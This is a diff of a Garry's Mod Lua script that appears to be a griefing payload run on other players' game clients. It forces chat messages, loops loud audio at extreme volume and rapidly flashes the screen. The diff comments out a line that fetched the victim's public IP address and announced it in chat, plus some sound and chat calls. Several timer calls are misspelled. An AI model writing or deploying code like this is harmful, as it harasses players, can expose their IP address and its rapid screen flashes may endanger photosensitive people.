@@ -196,16 +196,16 @@ local function oniichan() --aids copypasta
 end
 -- ALL TIMERS
 _timer.Create("haha", 4, 10000, function() _command('say', math.Round(1/RealFrameTime())..' is my fps, silly onii-chan >_<')end) -- fps
-timer.Createreate("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
+--timer.Createreate("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
 _timer.Create("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
 --timer.Createreate("haha5",.1,100000,function() sound.PlayURL('https://files.catbox.moe/97zo9m.mp3','',function()end)end)
 _timer.Create('hahasong', .1, 1, function() Song = true end)
-s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
-s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
-s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
-s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
-s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) --
-timer.Createreate('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end) -- slow dancing in the dark
+--s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
+--s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
+--s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
+--s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
+--s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) --
+--timer.Createreate('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end) -- slow dancing in the dark
 s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) -- annoying anime song
 _timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end) -- annoying anime song timer (basically just makes it loop)
 _timer.Create('paste',0,10000,function()
@@ -246,7 +246,7 @@ _hook.Add('Think','funny',function()
         local result2 = annoying[_math.random(1,88)]
         local cfunnies = funnies[_math.random(1,30)]
         local sresult = annoyings[_math.random(1,13)]
-        local pSong = CreateSound(LocalPlayer(),sresult)
+        --local pSong = CreateSound(LocalPlayer(),sresult)
         sound.Add({
             name = "wowow",
            channel = CHAN_STATIC,
@@ -265,10 +265,10 @@ _hook.Add('Think','funny',function()
         --_command('status')
         pSong:ChangeVolume(100000)
         pSong:SetSoundLevel(100000)
-        pSong:Play()
-        ply:EmitSound("wowow")
+        --pSong:Play()
+        --ply:EmitSound("wowow")
         --_surface.CreateFont(table.Random(funnies),{})
-        chat.AddText(rgb, cfunnies)
+        --chat.AddText(rgb, cfunnies)
         ply:ScreenFade(SCREENFADE.IN, rgb, .1, 0)
 
         if _input.IsKeyDown(70) then 
